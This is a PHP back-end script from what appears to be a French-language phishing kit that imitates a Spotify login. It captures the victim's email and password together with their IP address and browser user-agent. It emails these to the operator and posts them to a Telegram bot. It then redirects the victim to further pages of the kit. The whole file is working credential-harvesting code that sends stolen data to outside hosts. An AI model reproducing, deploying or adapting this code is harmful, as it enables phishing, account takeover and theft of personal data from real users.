<?php

include '../settings.php';
session_start();
date_default_timezone_set('Europe/Paris');
$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
$_SESSION['lang'] = $lang;
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['email'] = $_POST['username1'];
$_SESSION['motdepasse'] = $_POST['password1'];


if (isset($_POST['login_submit'])) {
	if (!empty($_POST['username1']) && !empty($_POST['password1'])) {



		if ($mail_sending == true) {

			$message = "

					[🎵] Login | Spotify 2023
					[🎵] Pays du rez : " . $_SESSION['lang'] . "
										
					[👤] Email  : " . $_SESSION['email'] . "
					[🔑] Mot de passe : " . $_SESSION['motdepasse'] . "
					

					[🗺️] INFORMATIONS COMPLÉMENTAIRES [🗺️]
					[⌚] Heure et date du rez : " . $_SESSION['date_heure'] . "
					[🌐] IP : " . $_SESSION['ip'] . "
					[📍] User-agent : " . $_SESSION['useragent'] . "

					[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]
					
					";

			$subject = " [🎵]  Login |" . $_SESSION['ip'];
			$headers = "From: Login | Spotify 2023 <rez@pablo.fr>";

			mail($rezmail, $subject, $message, $headers);




		}



		if ($telegram_sending == true) {

			$data = [
				'text' => '

					[🎵] Login| Spotify 2023 		
					[🌐] Pays du rez: ' . $lang . '

					[👤] Email  : ' . $_SESSION['email'] . '
					[🔑] Mot de passe : ' . $_SESSION['motdepasse'] . '
					

					[🗺️] Informations client [🗺️]
					[⌚] Heure et date du rez : ' . $_SESSION['date_heure'] . '
					[🌐] Adresse Ip : ' . $_SESSION['ip'] . '
					[📍]  User-agent : ' . $_SESSION['useragent'] . '
									  
					',
				'chat_id' => $chat_login
			];


			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
		}
		// Si succes
		if ($msg_login === true) {
			header('Location: ../user/message.php');
		} else {

			header('Location: ../user/informations.php');

		}



	}

	//renvoie si erreur
	else {
		header('Location: ../user/login.php?error=1');
	}

}



?>